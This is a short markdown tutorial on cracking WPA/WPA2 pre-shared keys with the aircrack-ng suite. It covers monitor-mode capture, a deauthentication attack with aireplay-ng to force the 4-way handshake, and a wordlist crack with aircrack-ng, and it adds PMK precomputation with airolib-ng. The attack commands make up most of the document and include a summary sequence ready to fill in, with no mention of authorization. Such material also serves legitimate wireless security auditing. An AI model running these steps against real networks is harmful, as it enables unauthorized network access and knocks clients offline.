# Cracking WPA_PSK with Aircrack-ng 

Cracking WPA/WPA2 can only be done on Pre-shared-keys by bruteforcing a weak key. 
The essential part to this crack is capturing the 4 way handshake. This takes place whenever a wireless client connects and authenticates to a WPA-enabled network. 

## Usage cracking with aircrack-ng

Start the monitor interface 
Capture the packets
Run a deauthentication attack on one of the clients. 
Run airecrack-ng to crack the password key

```
airmon-ng start wlan0 6
airodump-ng -c <channel> --bssid <Mac of AP> -w <filename_to_save_capture> mon0
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng -w <wordlist><capture>
```


## Usage cracking with airolib-ng 

airolib-ng stores and manages ESSID and password lists to compute their Pairwise Master Keys (PMK) to use to crack WPA and WPA2 passwords. 
To crack WPA, you need to calculate the PMK which the Private Transient Key is derived from. Calculating the PMK takes a lot of time, however, the key is always the same for a given ESSID and password. Therefore, we can pre-compute the PMK for given combinations and speed up the cracking. 

```
airolib-ng <database> <operation> [options]
```

where 


<database>: the name of the database
<operation>: specifies the action to take on the database
[options]: options may be required depending on the operation specified

Operation                         Description
--stats                           Output information about the database.
--sql {sql}                       Execute the specified SQL statement.
--clean [all]                     Clean the database of old junk. The option ‘all’ will reduce file size if possible and run an integrity check.
--batch                           Batch-process all combinations of ESSIDs and passwords.
--verify [all]                    Verify a set of randomly selected PMKs. If the ‘all’ option is used, all PMKs in the database are verified and incorrect ones are deleted.
--export cowpatty {essid} {file}  Export to a cowpatty file.
--import cowpatty {file}          Import a cowpatty file and create the database if it does not exist.
--import {essid|passwd} {file}    Import a text file of either ESSIDs or passwords and create the database if it does not exist. The file must contain one ESSID or password per line.


### Setting up airolib-ng 

create a file with out essid

```
echo <ESSID> > essid.txt 
```

import the ESSID text file into the airolib-ng database. 

```
airolib-ng <db name> --import essid <essid filename>
```

Look at the stats of the database 

```
airolib-ng <db name> --stats
```

import passwords into the database (some lines will be ignored if they are not valid WPA passwords) 

```
airolib-ng <db name> --import passwd <wordlist>
```

Generate all of the corresponding PMKs 

```
airolib-ng <db name> --batch
```

### Running the crack with the database 

```
aircrack-ng -r <db name> <capture>
```


## Summary 

Begin by placing your wireless card into monitor mode on the channel number of the AP:
Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:
Deauthenticate a connected client to force it to complete the 4-way handshake:
Crack the WPA password with Aircrack-ng:
Alternatively, if you have and Airolib-ng database, it can be passed to Aircrack:

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng -w <wordlist> <capture>
aircrack-ng -r <db name> <capture>
```



